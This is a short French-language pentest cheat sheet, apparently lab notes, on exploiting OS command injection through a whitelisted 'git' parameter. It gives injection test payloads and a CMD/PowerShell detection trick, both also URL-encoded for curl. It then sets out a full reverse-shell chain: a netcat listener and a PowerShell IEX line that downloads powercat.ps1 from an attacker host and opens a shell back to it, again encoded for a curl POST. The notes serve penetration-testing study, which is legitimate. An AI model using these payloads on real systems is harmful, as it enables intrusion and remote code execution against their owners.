Sur certain site, on peut executer une commande authorisé 
ex: git
On peut donc l'associer :
# Test si injection possible 
```
git;ipconfig
```

# Test pour connaitre le shell de commande: CMD ou POWERSHELL

```
git;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`

curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

```

# Téléchargement de powercat.ps1
Il faut mettre un serveur python dans le chemin :
```
/usr/share/powershell-empire/empire/server/data/module_source/management/
```
Et mettre une connexion netcat :
```shell
nc -nvlp 4444
```
La commande powershell qu'il faut lancer :
```shell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
encodé pour curl :
```shell
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

